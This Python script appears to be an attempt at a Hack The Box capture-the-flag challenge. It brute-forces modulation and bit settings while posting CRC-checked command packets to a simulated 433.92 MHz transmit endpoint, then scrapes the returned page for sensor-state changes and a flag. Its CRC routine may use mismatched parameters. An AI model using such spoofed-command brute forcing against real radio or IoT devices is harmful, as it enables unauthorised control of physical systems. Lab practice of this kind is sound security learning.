#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 149: Probar TODAS las combinaciones de modulación y bits
print("[*] INNOVACIÓN 149: Exhaustive modulation/bits combinations")

mods = ['ASK', 'FSK', 'GFSK', 'MSK', 'PSK', 'QPSK', 'BPSK', 'QAM', 'OOK', '2FSK', '4FSK', 'AFSK', 'GMSK']
bits_opts = ['1', '2', '4', '8', '16', '32']

count = 0
for mod in mods:
    for bits in bits_opts:
        s = requests.Session()
        s.get(base_url)
        
        # Enviar todos los paquetes
        for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
            data = bytes([addr, cmd])
            crc = crc16(data)
            packet = (data + struct.pack('<H', crc)).hex().upper()
            s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': mod, 'bits': bits, 'msg': packet})
        
        count += 1
        if count % 10 == 0:
            print(f'  Tested {count}/{len(mods)*len(bits_opts)}: {mod}/{bits}')
        
        time.sleep(1)
        
        # Verificar
        r = s.get(base_url)
        sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
        
        if sensor_states != ['text-warning'] * 4 + ['text-success'] * 3:
            print(f'\n[!!!] STATE CHANGED with {mod}/{bits}!')
            print(f'     States: {sensor_states}')
        
        if 'HTB{' in r.text:
            print(f'\n[SUCCESS] Found with {mod}/{bits}!')
            print(re.findall(r'HTB\{[^}]+\}', r.text))
            break

print(f'\n[*] Tested {count} combinations')
